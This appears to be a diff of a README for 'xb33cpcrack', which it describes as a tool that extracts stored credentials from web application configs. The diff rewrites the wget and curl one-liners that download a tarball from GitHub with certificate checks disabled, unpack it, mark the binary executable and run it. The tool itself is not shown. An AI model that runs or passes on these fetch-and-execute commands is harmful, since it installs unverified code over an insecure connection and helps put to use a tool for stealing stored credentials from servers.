@@ -27,12 +27,12 @@ Extracts stored credentials from web application configs, generates intelligent 
 
 ### One-liner (wget)
 ```bash
-wget https://github.com/seo-soon/xb33cpcrack/raw/main/xb33cpcrack.tgz --no-check-certificate -q -O- | tar xz && cd xb33cpcrack && chmod +x xb33cpcrack && ./xb33cpcrack
+wget https://github.com/seo-soon/xb33cpcrack/raw/main/xb33cpcrack.tgz --no-check-certificate -q && tar xzf xb33cpcrack.tgz && rm -f xb33cpcrack.tgz && cd xb33cpcrack && chmod +x xb33cpcrack && ./xb33cpcrack
 ```
 
 ### One-liner (curl)
 ```bash
-curl -fsSLk https://github.com/seo-soon/xb33cpcrack/raw/main/xb33cpcrack.tgz | tar xz && cd xb33cpcrack && chmod +x xb33cpcrack && ./xb33cpcrack
+curl -fsSLk https://github.com/seo-soon/xb33cpcrack/raw/main/xb33cpcrack.tgz -o xb33cpcrack.tgz && tar xzf xb33cpcrack.tgz && rm -f xb33cpcrack.tgz && cd xb33cpcrack && chmod +x xb33cpcrack && ./xb33cpcrack
 ```
 
 ### With custom password & email
